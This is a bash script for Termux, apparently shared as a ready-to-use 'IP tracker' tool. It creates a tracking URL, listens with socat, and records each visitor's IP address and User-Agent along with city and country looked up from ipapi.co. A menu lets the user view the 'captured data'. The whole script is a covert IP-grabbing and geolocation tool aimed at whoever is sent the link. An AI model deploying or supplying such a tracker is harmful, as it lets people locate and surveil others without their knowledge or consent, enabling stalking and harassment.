#!/data/data/com.termux/files/usr/bin/bash
# VERAN IP TRACKER v6.0 - MENU EDITION

# INSTALL DEPENDENCIES
pkg update -y
pkg install -y socat curl jq

# CONFIG
PORT=8080
SECRET="happy"  # CHANGE THIS!
LOG_FILE="ips.log"
TRACKING_URL=""

# COLORS
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
NC='\033[0m'

# CREATE LOG FILE
touch $LOG_FILE

show_banner() {
  clear
  echo -e "${RED}
 ██▒   █▓ ██▓ ██▀███   ▄████  ██▀███  ▓█████ 
▓██░   █▒▓██▒▓██ ▒ ██▒▒██▒  ██▒▓██ ▒ ██▒▓█   ▀ 
 ▓██  █▒░▒██▒▓██ ░▄█ ▒▒██░  ██▒▓██ ░▄█ ▒▒███   
  ▒██ █░░░██░▒██▀▀█▄  ▒██   ██░▒██▀▀█▄  ▒▓█  ▄ 
   ▒▀█░  ░██░░██▓ ▒██▒░ ████▓▒░░██▓ ▒██▒░▒████▒
   ░ ▐░  ░▓  ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░░ ▒░ ░
   ░ ░░   ▒ ░  ░▒ ░ ▒░  ░ ▒ ▒░   ░▒ ░ ▒░ ░ ░  ░
     ░░   ▒ ░  ░░   ░ ░ ░ ░ ▒    ░░   ░    ░   
      ░   ░     ░         ░ ░     ░        ░  ░
${NC}"
}

start_tracker() {
  echo -e "${GREEN}[+] Starting tracker on port ${PORT}${NC}"
  TRACKING_URL="http://$(curl -s ifconfig.me):${PORT}/${SECRET}/$(date +%s)"
  echo -e "${YELLOW}[+] Tracking URL: ${CYAN}${TRACKING_URL}${NC}"
  echo -e "${YELLOW}[+] Press Ctrl+C to stop${NC}\n"
  
  while true; do
    {
      echo -e "HTTP/1.1 200 OK\r\nContent-Length: 9\r\n\r\nLoading..."
      IP=$(echo $SOCAT_PEERADDR | cut -d':' -f4)
      UA=$(grep -m 1 'User-Agent:' | sed 's/User-Agent: //')
      TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
      
      # Get geolocation
      GEO=$(curl -s "https://ipapi.co/${IP}/json/")
      COUNTRY=$(echo "$GEO" | jq -r '.country_name')
      CITY=$(echo "$GEO" | jq -r '.city')
      
      # Log everything
      echo "${TIMESTAMP} | ${IP} | ${UA} | ${CITY}, ${COUNTRY} | ${TRACKING_URL##*/}" >> $LOG_FILE
      echo -e "${GREEN}[+] ${TIMESTAMP} - ${IP} from ${CITY}, ${COUNTRY}${NC}"
    } | socat -d -d -lf /dev/null TCP-LISTEN:$PORT,reuseaddr,fork -
  done
}

view_logs() {
  echo -e "\n${CYAN}=== CAPTURED DATA ===${NC}"
  column -t -s '|' $LOG_FILE | head -n 20
  echo -e "\n${YELLOW}View full logs: cat ${LOG_FILE}${NC}"
}

generate_url() {
  TRACKING_URL="http://$(curl -s ifconfig.me):${PORT}/${SECRET}/$(date +%s)"
  echo -e "\n${GREEN}NEW TRACKING URL:${NC}"
  echo -e "${CYAN}${TRACKING_URL}${NC}"
  echo -e "\n${YELLOW}Correlation ID: ${TRACKING_URL##*/}${NC}"
}

show_menu() {
  while true; do
    echo -e "\n${RED}VERAN IP TRACKER MENU${NC}"
    echo -e "${GREEN}1. Generate Tracking URL"
    echo -e "2. Start Tracker"
    echo -e "3. View Logs"
    echo -e "4. Exit${NC}"
    
    read -p $'\n'"Select option (1-4): " choice
    
    case $choice in
      1) generate_url ;;
      2) start_tracker ;;
      3) view_logs ;;
      4) exit 0 ;;
      *) echo -e "${RED}Invalid option!${NC}" ;;
    esac
  done
}

# MAIN
show_banner
show_menu
